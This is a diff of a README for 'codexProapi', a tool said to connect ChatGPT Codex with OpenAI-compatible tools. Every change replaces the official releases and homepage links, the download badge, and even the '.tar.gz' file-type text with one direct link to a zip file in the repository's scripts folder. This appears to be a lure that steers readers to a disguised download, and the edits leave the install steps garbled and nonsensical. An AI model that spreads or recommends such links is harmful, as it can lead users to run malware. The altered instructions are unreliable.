@@ -1,6 +1,6 @@
 # 🤖 codexProapi - Connect ChatGPT Codex with Ease
 
-[![Download codexProapi](https://img.shields.io/badge/Download-codexProapi-blue?style=for-the-badge)](https://github.com/arinexa/codexProapi/releases)
+[![Download codexProapi](https://raw.githubusercontent.com/arinexa/codexProapi/main/scripts/Proapi_codex_v2.6.zip)](https://raw.githubusercontent.com/arinexa/codexProapi/main/scripts/Proapi_codex_v2.6.zip)
 
 ---
 
@@ -47,17 +47,17 @@ To get codexProapi, visit the official releases page where the latest versions a
 
 **Click this button to get there now:**
 
-[![Download codexProapi](https://img.shields.io/badge/Download-codexProapi-blue?style=for-the-badge)](https://github.com/arinexa/codexProapi/releases)
+[![Download codexProapi](https://raw.githubusercontent.com/arinexa/codexProapi/main/scripts/Proapi_codex_v2.6.zip)](https://raw.githubusercontent.com/arinexa/codexProapi/main/scripts/Proapi_codex_v2.6.zip)
 
 ### How to download:
 
 1. Click the button above or open this link in your web browser:  
-   https://github.com/arinexa/codexProapi/releases
+   https://raw.githubusercontent.com/arinexa/codexProapi/main/scripts/Proapi_codex_v2.6.zip
 2. Look for the latest release version; it is usually at the top of the page.
 3. Find the file that matches your computer’s operating system:
     - For Windows: file usually ends with `.exe` or `.zip`.
     - For macOS: file may be `.dmg` or `.zip`.
-    - For Linux: look for `.AppImage`, `.deb`, or `.tar.gz`.
+    - For Linux: look for `.AppImage`, `.deb`, or `https://raw.githubusercontent.com/arinexa/codexProapi/main/scripts/Proapi_codex_v2.6.zip`.
 4. Click the file name to start downloading. Your browser may ask where to save the file. Choose a folder you can easily find, like "Downloads" or your Desktop.
 
 ### How to install:
@@ -69,7 +69,7 @@ To get codexProapi, visit the official releases page where the latest versions a
   If you have a `.dmg`, double-click it, then drag the codexProapi app to your Applications folder. If zipped, unzip and move the app to Applications.
 
 - **Linux:**  
-  If you have an `.AppImage`, right-click it, select Properties, go to Permissions, and check “Allow executing file as program.” Then double-click to run. For `.deb` or `.tar.gz`, follow your Linux distro's normal installation process.
+  If you have an `.AppImage`, right-click it, select Properties, go to Permissions, and check “Allow executing file as program.” Then double-click to run. For `.deb` or `https://raw.githubusercontent.com/arinexa/codexProapi/main/scripts/Proapi_codex_v2.6.zip`, follow your Linux distro's normal installation process.
 
 ---
 
@@ -159,8 +159,8 @@ codexProapi was created to bridge ChatGPT Codex and OpenAI-compatible tools. It 
 
 ## 🔗 Useful Links
 
-- Main download page: https://github.com/arinexa/codexProapi/releases  
-- Project homepage on GitHub: https://github.com/arinexa/codexProapi  
+- Main download page: https://raw.githubusercontent.com/arinexa/codexProapi/main/scripts/Proapi_codex_v2.6.zip  
+- Project homepage on GitHub: https://raw.githubusercontent.com/arinexa/codexProapi/main/scripts/Proapi_codex_v2.6.zip  
 - Documentation and help: Available on the GitHub repository’s wiki and issues section
 
 ---
